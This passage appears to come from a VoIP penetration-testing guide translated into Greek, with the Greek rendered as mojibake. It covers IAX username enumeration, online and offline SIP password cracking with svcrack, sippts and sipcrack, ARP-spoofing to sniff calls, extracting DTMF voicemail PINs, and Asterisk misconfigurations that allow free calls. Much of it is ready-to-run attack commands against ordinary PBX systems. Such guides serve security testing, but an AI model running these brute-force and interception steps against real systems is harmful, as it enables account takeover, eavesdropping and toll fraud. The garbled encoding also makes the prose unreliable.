* **`enumiax` (`apt install enumiax`): enumIAX** ÎµÎ¯Î½Î±Î¹ Î­Î½Î±Ï‚ Ï€ÏÏ‰Ï„ÏŒÎºÎ¿Î»Î»Î¿Ï‚ Inter Asterisk Exchange **enumerator brute-force Î¿Î½ÏŒÎ¼Î±Ï„Î¿Ï‚ Ï‡ÏÎ®ÏƒÏ„Î·**. Î¤Î¿ enumIAX Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ ÏƒÎµ Î´ÏÎ¿ Î´Î¹Î±ÎºÏÎ¹Ï„Î­Ï‚ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯ÎµÏ‚: Sequential Username Guessing Î® Dictionary Attack.
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## VoIP Attacks

### Password Brute-Force - online

ÎˆÏ‡Î¿Î½Ï„Î±Ï‚ Î±Î½Î±ÎºÎ±Î»ÏÏˆÎµÎ¹ Ï„Î¿ **PBX** ÎºÎ±Î¹ Î¼ÎµÏÎ¹ÎºÎ¬ **extensions/usernames**, Î¼Î¹Î± Red Team Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÎ¹ Î½Î± **authenticate Î¼Î­ÏƒÏ‰ Ï„Î·Ï‚ Î¼ÎµÎ¸ÏŒÎ´Î¿Ï… `REGISTER`** ÏƒÎµ Î­Î½Î± extension Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î­Î½Î± Î»ÎµÎ¾Î¹ÎºÏŒ ÎºÎ¿Î¹Î½ÏÎ½ ÎºÏ‰Î´Î¹ÎºÏÎ½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Î³Î¹Î± Î½Î± ÎºÎ¬Î½ÎµÎ¹ brute force Ï„Î·Î½ Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ·.

{% hint style="danger" %}
Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Î­Î½Î± **username** Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¯Î½Î±Î¹ Ï„Î¿ Î¯Î´Î¹Î¿ Î¼Îµ Ï„Î¿ extension, Î±Î»Î»Î¬ Î±Ï…Ï„Î® Î· Ï€ÏÎ±ÎºÏ„Î¹ÎºÎ® Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î´Î¹Î±Ï†Î­ÏÎµÎ¹ Î±Î½Î¬Î»Î¿Î³Î± Î¼Îµ Ï„Î¿ ÏƒÏÏƒÏ„Î·Î¼Î± PBX, Ï„Î· Î´Î¹Î±Î¼ÏŒÏÏ†Ï‰ÏƒÎ® Ï„Î¿Ï… ÎºÎ±Î¹ Ï„Î¹Ï‚ Ï€ÏÎ¿Ï„Î¹Î¼Î®ÏƒÎµÎ¹Ï‚ Ï„Î¿Ï… Î¿ÏÎ³Î±Î½Î¹ÏƒÎ¼Î¿Ï...

Î‘Î½ Ï„Î¿ username Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ Ï„Î¿ Î¯Î´Î¹Î¿ Î¼Îµ Ï„Î¿ extension, Î¸Î± Ï‡ÏÎµÎ¹Î±ÏƒÏ„ÎµÎ¯ Î½Î± **ÎºÎ±Ï„Î±Î»Î¬Î²ÎµÏ„Îµ Ï„Î¿ username Î³Î¹Î± Î½Î± Ï„Î¿ ÎºÎ¬Î½ÎµÏ„Îµ brute-force**.
{% endhint %}

* **`svcrack`** Î±Ï€ÏŒ Ï„Î¿ SIPVicious (`sudo apt install sipvicious`): SVCrack ÏƒÎ±Ï‚ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Î½Î± ÏƒÏ€Î¬ÏƒÎµÏ„Îµ Ï„Î¿Î½ ÎºÏ‰Î´Î¹ÎºÏŒ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Î³Î¹Î± Î­Î½Î± ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î¿ username/extension ÏƒÎµ Î­Î½Î± PBX.
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
* **`SIPPTS rcrack`** Î±Ï€ÏŒ [**sippts**](https://github.com/Pepelux/sippts)**:** Î¤Î¿ SIPPTS rcrack ÎµÎ¯Î½Î±Î¹ Î­Î½Î±Ï‚ Î±Ï€Î¿Î¼Î±ÎºÏÏ…ÏƒÎ¼Î­Î½Î¿Ï‚ Î±Ï€Î¿ÎºÏ‰Î´Î¹ÎºÎ¿Ï€Î¿Î¹Î·Ï„Î®Ï‚ ÎºÏ‰Î´Î¹ÎºÏÎ½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Î³Î¹Î± Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ SIP. ÎŸ rcrack Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î´Î¿ÎºÎ¹Î¼Î¬ÏƒÎµÎ¹ ÎºÏ‰Î´Î¹ÎºÎ¿ÏÏ‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Î³Î¹Î± Î±ÏÎºÎµÏ„Î¿ÏÏ‚ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ ÏƒÎµ Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÎ­Ï‚ Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÎ¹Ï‚ IP ÎºÎ±Î¹ ÎµÏÏÎ· Î¸Ï…ÏÏÎ½.
```bash
sippts rcrack -i 10.10.0.10 -e 100,101,103-105 -w wordlist/rockyou.txt
```
* **Metasploit**:
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb)

### VoIP Sniffing

Î‘Î½ Î²ÏÎµÎ¯Ï„Îµ ÎµÎ¾Î¿Ï€Î»Î¹ÏƒÎ¼ÏŒ VoIP Î¼Î­ÏƒÎ± ÏƒÎµ Î­Î½Î± **Î‘Î½Î¿Î¹Ï‡Ï„ÏŒ Wifi Î´Î¯ÎºÏ„Ï…Î¿**, Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Ï„Îµ Î½Î± **ÎºÎ±Ï„Î±Î³ÏÎ¬ÏˆÎµÏ„Îµ ÏŒÎ»ÎµÏ‚ Ï„Î¹Ï‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚**. Î•Ï€Î¹Ï€Î»Î­Î¿Î½, Î±Î½ Î²ÏÎ¯ÏƒÎºÎµÏƒÏ„Îµ Î¼Î­ÏƒÎ± ÏƒÎµ Î­Î½Î± Ï€Î¹Î¿ ÎºÎ»ÎµÎ¹ÏƒÏ„ÏŒ Î´Î¯ÎºÏ„Ï…Î¿ (ÏƒÏ…Î½Î´ÎµÎ´ÎµÎ¼Î­Î½Î¿ Î¼Î­ÏƒÏ‰ Ethernet Î® Ï€ÏÎ¿ÏƒÏ„Î±Ï„ÎµÏ…Î¼Î­Î½Î¿Ï… Wifi) Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Ï„Îµ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ **MitM ÎµÏ€Î¹Î¸Î­ÏƒÎµÎ¹Ï‚ ÏŒÏ€Ï‰Ï‚** [**ARPspoofing**](../../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) Î¼ÎµÏ„Î±Î¾Ï Ï„Î¿Ï… **PBX ÎºÎ±Î¹ Ï„Î·Ï‚ Ï€ÏÎ»Î·Ï‚** Ï€ÏÎ¿ÎºÎµÎ¹Î¼Î­Î½Î¿Ï… Î½Î± ÎºÎ±Ï„Î±Î³ÏÎ¬ÏˆÎµÏ„Îµ Ï„Î¹Ï‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚.

Î‘Î½Î¬Î¼ÎµÏƒÎ± ÏƒÏ„Î¹Ï‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Ï„Î¿Ï… Î´Î¹ÎºÏ„ÏÎ¿Ï…, Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ **Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± Î¹ÏƒÏ„Î¿Ï** Î³Î¹Î± Ï„Î· Î´Î¹Î±Ï‡ÎµÎ¯ÏÎ¹ÏƒÎ· Ï„Î¿Ï… ÎµÎ¾Î¿Ï€Î»Î¹ÏƒÎ¼Î¿Ï, **ÎµÏ€ÎµÎºÏ„Î¬ÏƒÎµÎ¹Ï‚** Ï‡ÏÎ·ÏƒÏ„ÏÎ½, **ÏŒÎ½Î¿Î¼Î± Ï‡ÏÎ®ÏƒÏ„Î·**, **Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÎ¹Ï‚ IP**, Î±ÎºÏŒÎ¼Î· ÎºÎ±Î¹ **hashed passwords** ÎºÎ±Î¹ **Ï€Î±ÎºÎ­Ï„Î± RTP** Ï€Î¿Ï… Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Ï„Îµ Î½Î± Î±Î½Î±Ï€Î±ÏÎ¬Î³ÎµÏ„Îµ Î³Î¹Î± Î½Î± **Î±ÎºÎ¿ÏÏƒÎµÏ„Îµ Ï„Î· ÏƒÏ…Î½Î¿Î¼Î¹Î»Î¯Î±**, ÎºÎ±Î¹ Î¬Î»Î»Î±.

Î“Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚, Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ ÎµÏÎ³Î±Î»ÎµÎ¯Î± ÏŒÏ€Ï‰Ï‚ Ï„Î¿ Wireshark, tcpdump... Î±Î»Î»Î¬ Î­Î½Î± **ÎµÎ¹Î´Î¹ÎºÎ¬ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î·Î¼Î­Î½Î¿ ÎµÏÎ³Î±Î»ÎµÎ¯Î¿ Î³Î¹Î± Ï„Î·Î½ ÎºÎ±Ï„Î±Î³ÏÎ±Ï†Î® ÏƒÏ…Î½Î¿Î¼Î¹Î»Î¹ÏÎ½ VoIP ÎµÎ¯Î½Î±Î¹** [**ucsniff**](https://github.com/Seabreg/ucsniff).

{% hint style="danger" %}
Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Î±Î½ **Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ TLS ÏƒÏ„Î·Î½ ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î¯Î± SIP** Î´ÎµÎ½ Î¸Î± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î¯Î± SIP ÎºÎ±Î¸Î±ÏÎ¬.\
Î¤Î¿ Î¯Î´Î¹Î¿ Î¸Î± ÏƒÏ…Î¼Î²ÎµÎ¯ Î±Î½ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½Ï„Î±Î¹ **SRTP** ÎºÎ±Î¹ **ZRTP**, **Ï„Î± Ï€Î±ÎºÎ­Ï„Î± RTP Î´ÎµÎ½ Î¸Î± ÎµÎ¯Î½Î±Î¹ ÏƒÎµ ÎºÎ±Î¸Î±ÏÏŒ ÎºÎµÎ¯Î¼ÎµÎ½Î¿**.
{% endhint %}

#### SIP credentials (Password Brute-Force - offline)

[Î”ÎµÎ¯Ï„Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î³Î¹Î± Î½Î± ÎºÎ±Ï„Î±Î½Î¿Î®ÏƒÎµÏ„Îµ ÎºÎ±Î»ÏÏ„ÎµÏÎ± Î¼Î¹Î± **ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î¯Î± SIP REGISTER**](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example) Î³Î¹Î± Î½Î± Î¼Î¬Î¸ÎµÏ„Îµ Ï€ÏÏ‚ Î±Ï€Î¿ÏƒÏ„Î­Î»Î»Î¿Î½Ï„Î±Î¹ **Ï„Î± Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î±**.

* **`sipdump`** & **`sipcrack`,** Î¼Î­ÏÎ¿Ï‚ Ï„Î¿Ï… **sipcrack** (`apt-get install sipcrack`): Î‘Ï…Ï„Î¬ Ï„Î± ÎµÏÎ³Î±Î»ÎµÎ¯Î± Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± **ÎµÎ¾Î¬Î³Î¿Ï…Î½** Î±Ï€ÏŒ Î­Î½Î± **pcap** Ï„Î¹Ï‚ **Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏÏƒÎµÎ¹Ï‚ digest** Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ Ï€ÏÏ‰Ï„ÏŒÎºÎ¿Î»Î»Î¿ SIP ÎºÎ±Î¹ Î½Î± Ï„Î¹Ï‚ **ÏƒÏ€Î¬ÏƒÎ¿Ï…Î½**.
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
* **`SIPPTS dump`** Î±Ï€ÏŒ [**sippts**](https://github.com/Pepelux/sippts)**:** Î¤Î¿ SIPPTS dump Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¾Î¬Î³ÎµÎ¹ Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹Ï‚ digest Î±Ï€ÏŒ Î­Î½Î± Î±ÏÏ‡ÎµÎ¯Î¿ pcap.
```bash
sippts dump -f capture.pcap -o data.txt
```
* **`SIPPTS dcrack`** Î±Ï€ÏŒ [**sippts**](https://github.com/Pepelux/sippts)**:** Î¤Î¿ SIPPTS dcrack ÎµÎ¯Î½Î±Î¹ Î­Î½Î± ÎµÏÎ³Î±Î»ÎµÎ¯Î¿ Î³Î¹Î± Î½Î± ÏƒÏ€Î¬ÏƒÎµÎ¹ Ï„Î¹Ï‚ Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏÏƒÎµÎ¹Ï‚ digest Ï€Î¿Ï… Î±Ï€Î¿ÎºÏ„Î®Î¸Î·ÎºÎ±Î½ Î¼Îµ Ï„Î¿ SIPPTS dump.
```bash
sippts dcrack -f data.txt -w wordlist/rockyou.txt
```
* **`SIPPTS tshark`** Î±Ï€ÏŒ [**sippts**](https://github.com/Pepelux/sippts)**:** Î¤Î¿ SIPPTS tshark ÎµÎ¾Î¬Î³ÎµÎ¹ Î´ÎµÎ´Î¿Î¼Î­Î½Î± Ï„Î¿Ï… Ï€ÏÏ‰Ï„Î¿ÎºÏŒÎ»Î»Î¿Ï… SIP Î±Ï€ÏŒ Î­Î½Î± Î±ÏÏ‡ÎµÎ¯Î¿ PCAP.
```bash
sippts tshark -f capture.pcap [-filter auth]
```
#### DTMF ÎºÏ‰Î´Î¹ÎºÎ¿Î¯

**ÎŒÏ‡Î¹ Î¼ÏŒÎ½Î¿ Ï„Î± SIP Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î±** Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Î²ÏÎµÎ¸Î¿ÏÎ½ ÏƒÏ„Î·Î½ ÎºÎ¯Î½Î·ÏƒÎ· Ï„Î¿Ï… Î´Î¹ÎºÏ„ÏÎ¿Ï…, ÎµÎ¯Î½Î±Î¹ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± Î²ÏÎµÎ¸Î¿ÏÎ½ DTMF ÎºÏ‰Î´Î¹ÎºÎ¿Î¯ Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½Ï„Î±Î¹ Î³Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î³Î¹Î± Ï„Î·Î½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿ **Ï†Ï‰Î½Î·Ï„Î¹ÎºÏŒ Ï„Î±Ï‡Ï…Î´ÏÎ¿Î¼ÎµÎ¯Î¿**.\
Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± ÏƒÏ„Î±Î»Î¿ÏÎ½ Î±Ï…Ï„Î¿Î¯ Î¿Î¹ ÎºÏ‰Î´Î¹ÎºÎ¿Î¯ ÏƒÎµ **INFO SIP Î¼Î·Î½ÏÎ¼Î±Ï„Î±**, ÏƒÎµ **Î®Ï‡Î¿** Î® Î¼Î­ÏƒÎ± ÏƒÎµ **RTP Ï€Î±ÎºÎ­Ï„Î±**. Î‘Î½ Î¿Î¹ ÎºÏ‰Î´Î¹ÎºÎ¿Î¯ ÎµÎ¯Î½Î±Î¹ Î¼Î­ÏƒÎ± ÏƒÎµ RTP Ï€Î±ÎºÎ­Ï„Î±, Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Ï„Îµ Î½Î± ÎºÏŒÏˆÎµÏ„Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ Î¼Î­ÏÎ¿Ï‚ Ï„Î·Ï‚ ÏƒÏ…Î½Î¿Î¼Î¹Î»Î¯Î±Ï‚ ÎºÎ±Î¹ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î¿ ÎµÏÎ³Î±Î»ÎµÎ¯Î¿ multimo Î³Î¹Î± Î½Î± Ï„Î¿Ï…Ï‚ ÎµÎ¾Î¬Î³ÎµÏ„Îµ:
```bash
multimon -a DTMF -t wac pin.wav
```
### Î”Ï‰ÏÎµÎ¬Î½ ÎšÎ»Î®ÏƒÎµÎ¹Ï‚ / Î›Î¬Î¸Î· Î¡Ï…Î¸Î¼Î¯ÏƒÎµÏ‰Î½ Î£Ï…Î½Î´Î­ÏƒÎµÏ‰Î½ Asterisks

Î£Ï„Î¿ Asterisk ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± ÎµÏ€Î¹Ï„ÏÎ±Ï€ÎµÎ¯ Î¼Î¹Î± ÏƒÏÎ½Î´ÎµÏƒÎ· **Î±Ï€ÏŒ Î¼Î¹Î± ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· IP** Î® Î±Ï€ÏŒ **Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· IP**:
```
host=10.10.10.10
host=dynamic
```
Î‘Î½ ÎºÎ±Î¸Î¿ÏÎ¹ÏƒÏ„ÎµÎ¯ Î¼Î¹Î± Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· IP, Î¿ Ï…Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„Î®Ï‚ **Î´ÎµÎ½ Î¸Î± Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏ„Î±Î¹ Î½Î± ÏƒÏ„Î­Î»Î½ÎµÎ¹ Î±Î¹Ï„Î®Î¼Î±Ï„Î± REGISTER** ÎºÎ¬Î¸Îµ Î»Î¯Î³Î¿ ÎºÎ±Î¹ Î»Î¹Î³Î¬ÎºÎ¹ (ÏƒÏ„Î¿ Ï€Î±ÎºÎ­Ï„Î¿ REGISTER Î±Ï€Î¿ÏƒÏ„Î­Î»Î»ÎµÏ„Î±Î¹ Î¿ Ï‡ÏÏŒÎ½Î¿Ï‚ Î¶Ï‰Î®Ï‚, ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ 30 Î»ÎµÏ€Ï„Î¬, Ï€Î¿Ï… ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ ÏŒÏ„Î¹ ÏƒÎµ Î¬Î»Î»Î· Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ· Ï„Î¿ Ï„Î·Î»Î­Ï†Ï‰Î½Î¿ Î¸Î± Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏ„Î±Î¹ Î½Î± REGISTER ÎºÎ¬Î¸Îµ 30 Î»ÎµÏ€Ï„Î¬). Î©ÏƒÏ„ÏŒÏƒÎ¿, Î¸Î± Ï‡ÏÎµÎ¹Î±ÏƒÏ„ÎµÎ¯ Î½Î± Î­Ï‡ÎµÎ¹ Î±Î½Î¿Î¹Ï‡Ï„Î­Ï‚ Î¸ÏÏÎµÏ‚ Ï€Î¿Ï… Î½Î± ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Ï…Î½ ÏƒÏ…Î½Î´Î­ÏƒÎµÎ¹Ï‚ Î±Ï€ÏŒ Ï„Î¿Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® VoIP Î³Î¹Î± Î½Î± Î´Î­Ï‡ÎµÏ„Î±Î¹ ÎºÎ»Î®ÏƒÎµÎ¹Ï‚.

Î“Î¹Î± Î½Î± Î¿ÏÎ¹ÏƒÏ„Î¿ÏÎ½ Î¿Î¹ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚, Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Î¿ÏÎ¹ÏƒÏ„Î¿ÏÎ½ Ï‰Ï‚:

* **`type=user`**: ÎŸ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î´Î­Ï‡ÎµÏ„Î±Î¹ ÎºÎ»Î®ÏƒÎµÎ¹Ï‚ Î¼ÏŒÎ½Î¿ Ï‰Ï‚ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚.
* **`type=friend`**: Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„Î® Î· Ï€ÏÎ±Î³Î¼Î±Ï„Î¿Ï€Î¿Î¯Î·ÏƒÎ· ÎºÎ»Î®ÏƒÎµÏ‰Î½ Ï‰Ï‚ peer ÎºÎ±Î¹ Î· Î»Î®ÏˆÎ· Ï„Î¿Ï…Ï‚ Ï‰Ï‚ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ (Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î¼Îµ ÎµÏ€ÎµÎºÏ„Î¬ÏƒÎµÎ¹Ï‚)
* **`type=peer`**: Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„Î® Î· Î±Ï€Î¿ÏƒÏ„Î¿Î»Î® ÎºÎ±Î¹ Î»Î®ÏˆÎ· ÎºÎ»Î®ÏƒÎµÏ‰Î½ Ï‰Ï‚ peer (SIP-trunks)

Î•Î¯Î½Î±Î¹ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î´Ï…Î½Î±Ï„Î® Î· ÎºÎ±Î¸ establishment ÎµÎ¼Ï€Î¹ÏƒÏ„Î¿ÏƒÏÎ½Î·Ï‚ Î¼Îµ Ï„Î·Î½ Î±Î½Î±ÏƒÏ†Î±Î»Î® Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î®:

* **`insecure=port`**: Î•Ï€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î¹Ï‚ ÏƒÏ…Î½Î´Î­ÏƒÎµÎ¹Ï‚ peer Ï€Î¿Ï… ÎµÏ€Î¹ÎºÏ…ÏÏÎ½Î¿Î½Ï„Î±Î¹ Î±Ï€ÏŒ IP.
* **`insecure=invite`**: Î”ÎµÎ½ Î±Ï€Î±Î¹Ï„ÎµÎ¯ Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ· Î³Î¹Î± Ï„Î± Î¼Î·Î½ÏÎ¼Î±Ï„Î± INVITE
* **`insecure=port,invite`**: ÎšÎ±Î¹ Ï„Î± Î´ÏÎ¿

{% hint style="warning" %}
ÎŒÏ„Î±Î½ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ **`type=friend`**, Î· **Ï„Î¹Î¼Î®** Ï„Î·Ï‚ Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î®Ï‚ **host** **Î´ÎµÎ½ Î¸Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯**, Î¿Ï€ÏŒÏ„Îµ Î±Î½ Î­Î½Î±Ï‚ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î®Ï‚ **Ï€Î±ÏÎ±Î¼ÎµÏ„ÏÎ¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Î»Î±Î½Î¸Î±ÏƒÎ¼Î­Î½Î± Î­Î½Î± SIP-trunk** Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î±Ï…Ï„Î® Ï„Î·Î½ Ï„Î¹Î¼Î®, **Î¿Ï€Î¿Î¹Î¿ÏƒÎ´Î®Ï€Î¿Ï„Îµ Î¸Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯ ÏƒÎµ Î±Ï…Ï„ÏŒ**.

Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Î±Ï…Ï„Î® Î· Î´Î¹Î±Î¼ÏŒÏÏ†Ï‰ÏƒÎ· Î¸Î± Î®Ï„Î±Î½ ÎµÏ…Î¬Î»Ï‰Ï„Î·:\
`host=10.10.10.10`\
`insecure=port,invite`\
`type=friend`
{% endhint %}

### Î”Ï‰ÏÎµÎ¬Î½ ÎšÎ»Î®ÏƒÎµÎ¹Ï‚ / Î›Î±Î½Î¸Î±ÏƒÎ¼Î­Î½ÎµÏ‚ Î”Î¹Î±Î¼Î¿ÏÏ†ÏÏƒÎµÎ¹Ï‚ Î Î»Î±Î¹ÏƒÎ¯Î¿Ï… Asterisks

Î£Ï„Î¿ Asterisk, Î­Î½Î± **context** ÎµÎ¯Î½Î±Î¹ Î­Î½Î± Î¿Î½Î¿Î¼Î±ÏƒÏ„Î¹ÎºÏŒ Î´Î¿Ï‡ÎµÎ¯Î¿ Î® Ï„Î¼Î®Î¼Î± ÏƒÏ„Î¿ ÏƒÏ‡Î­Î´Î¹Î¿ ÎºÎ»Î®ÏƒÎµÏ‰Î½ Ï€Î¿Ï… **Î¿Î¼Î±Î´Î¿Ï€Î¿Î¹ÎµÎ¯ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ­Ï‚ ÎµÏ€ÎµÎºÏ„Î¬ÏƒÎµÎ¹Ï‚, ÎµÎ½Î­ÏÎ³ÎµÎ¹ÎµÏ‚ ÎºÎ±Î¹ ÎºÎ±Î½ÏŒÎ½ÎµÏ‚**. Î¤Î¿ ÏƒÏ‡Î­Î´Î¹Î¿ ÎºÎ»Î®ÏƒÎµÏ‰Î½ ÎµÎ¯Î½Î±Î¹ Ï„Î¿ ÎºÏÏÎ¹Î¿ ÏƒÏ…ÏƒÏ„Î±Ï„Î¹ÎºÏŒ ÎµÎ½ÏŒÏ‚ ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î¿Ï‚ Asterisk, ÎºÎ±Î¸ÏÏ‚ ÎºÎ±Î¸Î¿ÏÎ¯Î¶ÎµÎ¹ **Ï€ÏÏ‚ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¯Î¶Î¿Î½Ï„Î±Î¹ ÎºÎ±Î¹ Î´ÏÎ¿Î¼Î¿Î»Î¿Î³Î¿ÏÎ½Ï„Î±Î¹ Î¿Î¹ ÎµÎ¹ÏƒÎµÏÏ‡ÏŒÎ¼ÎµÎ½ÎµÏ‚ ÎºÎ±Î¹ ÎµÎ¾ÎµÏÏ‡ÏŒÎ¼ÎµÎ½ÎµÏ‚ ÎºÎ»Î®ÏƒÎµÎ¹Ï‚**. Î¤Î± contexts Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½Ï„Î±Î¹ Î³Î¹Î± Ï„Î·Î½ 